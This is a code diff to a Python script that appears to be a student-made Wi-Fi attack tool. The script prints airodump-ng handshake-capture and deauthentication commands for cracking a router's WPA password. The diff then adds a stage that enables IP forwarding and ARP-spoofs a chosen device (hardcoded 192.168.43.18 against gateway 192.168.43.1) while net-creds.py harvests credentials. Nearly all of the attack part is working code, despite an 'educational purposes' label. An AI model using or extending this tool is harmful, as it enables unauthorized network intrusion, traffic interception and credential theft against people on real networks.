@@ -1,7 +1,9 @@
 # Authors: Shir, Hodaya and Alexey
-# Version: 3.0
+# Version: 4.0
 # Date: 07/2019
-# https://stackoverflow.com/questions/19311673/fetch-source-address-and-port-number-of-packet-scapy-script
+# Sources:
+#	https://stackoverflow.com/questions/19311673/fetch-source-address-and-port-number-of-packet-scapy-script
+#	https://github.com/ickerwx/arpspoof
 
 # libraries
 import argparse
@@ -27,6 +29,7 @@ except ImportError:
     exit(1)
 from classes.prints import PRINTS
 from classes.ap import AP
+from classes.arpspoof import ARPspoof
 
 # Colours for print
 GREEN = '\033[92m'
@@ -191,15 +194,10 @@ def CrackWiFi(MAC_ROUTER, CHANNEL, wlan):
     try:
         # sudo airodump-ng --bssid [MAC-ROUTER] --channel [CHANNEL] -w /root/Desktop/mywifi wlan0mon
         command = 'airodump-ng --bssid ' + str(MAC_ROUTER) + ' --channel ' + str(CHANNEL) + ' -w ' + str(PATH) + '/ ' + wlan 
-        print(BOLD + 'In new terminal run command: ' + command + ENDC)
-        command = 'gnome-terminal'
-        subprocess.Popen(command)
-        print(BOLD + 'wait for what handsheck happens' + ENDC)
+        print(BOLD + '[*] In new terminal run command: ' + command + ENDC)
+        print(BOLD + '[+] wait for what handsheck happens' + ENDC)
         command = 'python ash_short.py -w ' + wlan + ' -b ' + str(MAC_ROUTER) + ' -d [STATION]'
-        print(BOLD + 'In new terminal run command: ' + command + ENDC)
-        command = 'gnome-terminal'
-        subprocess.Popen(command)
-        print(BOLD + 'wait for what handsheck happens' + ENDC)
+        print(BOLD + '[*] In new terminal run command: ' + command + ENDC)
         password = raw_input(GREEN + 'Enter password: ' + ENDC)
         # sudo airmon-ng stop wlan0mon
         p = subprocess.Popen(['airmon-ng', 'stop', wlan], stdout=subprocess.PIPE, stderr=subprocess.PIPE)               # stop monitor mode
@@ -253,6 +251,7 @@ def connectTONETWORK(ap, wlan):
         else:
             print(GREEN + "[+] Connect to " + str(SSID) + "...\n" + ENDC)
             os.system('ifconfig enp0s3 down')
+            os.system('ifconfig eth0 down')
             BASE_IP, ROUTER_IP, IPs = scanIP(wlan, BSSID)
     else:
         flag, password = CrackWiFi(BSSID, CHANNEL, wlan)
@@ -274,6 +273,7 @@ def connectTONETWORK(ap, wlan):
                 print(GREEN + "[+] Connect to " + str(SSID) + "...\n" + ENDC)
                 time.sleep(5)
                 os.system('ifconfig enp0s3 down')
+                os.system('ifconfig eth0 down')
                 BASE_IP, ROUTER_IP, IPs = scanIP(wlan, BSSID)
     return BASE_IP, ROUTER_IP, IPs 
 
@@ -285,7 +285,7 @@ if __name__ == "__main__":
     # Parser of arguments from command line	
     parser = argparse.ArgumentParser(description='[Coded by Shir, Hodaya & Alexey]', epilog="Please use the program for educational purposes.")
     parser.add_argument('-w', action='store', dest='wlan', type = str, help='iface for monitoring')
-    parser.add_argument('-v', action='version', version='%(prog)s 1.0')
+    parser.add_argument('-v', action='version', version='%(prog)s 4.1')
     results = parser.parse_args()
     logos.banner()
     check_root()
@@ -308,7 +308,7 @@ if __name__ == "__main__":
     # Chose wanted AP
     os.system('ifconfig ' + newiface + ' down')
     os.system('ifconfig ' + newiface + ' up')
-    print("Input the index of the AP you want to scan: ")	
+    print(BOLD + "[*] Input the index of the AP you want to scan: " + ENDC)	
     ap_choice = input()
     x = 1
     # Check your choose
@@ -319,11 +319,16 @@ if __name__ == "__main__":
         exit(0)
     
     # Chose wanted device
-    print("Input the index of the device you want to attack: ")	
+    print(BOLD + "[*] Input the index of the device you want to attack: " + ENDC)	
     ip_choice = input()
     # Check your choose
-    if (type(ip_choice) == type(x) and ip_choice < len(IPs) and ip_choice > -1):	
-        pass
+    if(type(ip_choice) == type(x) and ip_choice > 0):
+    #if (type(ip_choice) == type(x) and ip_choice < len(IPs) and ip_choice > -1):
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        time.sleep(15)	
+        arp = ARPspoof('wlan0', '192.168.43.18', '192.168.43.1')
+        print(BOLD + 'In new terminal run command: python net-creds.py' + ENDC)
+        arp.runARP()
     else:		
 	print(RED + "[-] Illegal index" + ENDC)
         exit(0)
